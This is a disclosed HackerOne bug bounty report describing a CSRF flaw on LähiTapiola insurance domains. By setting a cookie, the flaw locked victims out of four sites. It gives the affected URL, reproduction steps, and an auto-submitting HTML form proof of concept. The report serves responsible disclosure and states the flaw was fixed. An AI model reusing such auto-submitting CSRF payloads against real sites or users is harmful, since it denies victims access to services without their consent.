@@ -1,0 +1,64 @@
+ReportLink:https://hackerone.com/reports/129001
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/putsi
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:400.0
+Severity:
+State:Closed
+DateOfDisclosure:30.08.2016 19:13:39
+
+Summary:
+##Issue
+
+The reporter was able to craft a CSRF (and direct URL) that triggered a single user denial of service by modifying a cookie. The affected user had to manually delete the selectedArea -cookie to resolve the situation.  The report contained a thorough PoC which assisted the triaging process.
+
+##Fix
+
+The issue was investigated and found to be valid. The flaw was simple as such but proved to be multifaceted and the fix required a few iterations to cover all aspects. 
+
+##Reasoning
+
+The reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. 
+
+# Cookie-based client-side denial-of-service to all of the Lähitapiola domains
+
+Time of detection: 23.2.2016 03:00-04:00
+
+Affected URL: https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi
+
+## Description:
+After the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).
+The vulnerability affects anonymous AND authenticated users.
+This full client-side denial-of-service will last until the "selectedArea"-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the "selectedArea"-cookie.
+
+## List of domains which cannot be used by the client:
+- www.tapiola.fi
+- www.lahitapiola.fi
+- verkkopalvelu.tapiola.fi
+- yrityspalvelu.tapiola.fi
+
+## Steps to reproduce:
+1. Navigate either directly or via CSRF-attack to following URL:
+ - https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi
+2. Try to open www.tapiola.fi and notice that a white screen is returned.
+3. Try to open www.lahitapiola.fi and notice that a white screen is returned.
+4. Try to open verkkopalvelu.tapiola.fi and notice that a white screen is returned.
+5. Try to open yrityspalvelu.tapiola.fi and notice that a white screen is returned.
+6. Delete browser cookies and notice that you can now browse the Lähitapiola-website normally.
+
+## CSRF proof-of-concept:
+
+<html>
+  <body>
+    <form action="https://www.lahitapiola.fi/cs/Satellite">
+      <input type="hidden" name="pagename" value="LahiTapiola&#47;LTStatus" />
+      <input type="hidden" name="cookieName" value="selectedArea" />
+      <input type="hidden" name="cookieValue" value="1" />
+      <input type="hidden" name="backurl" value="http&#58;&#47;&#47;www&#46;lahitapiola&#46;fi" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
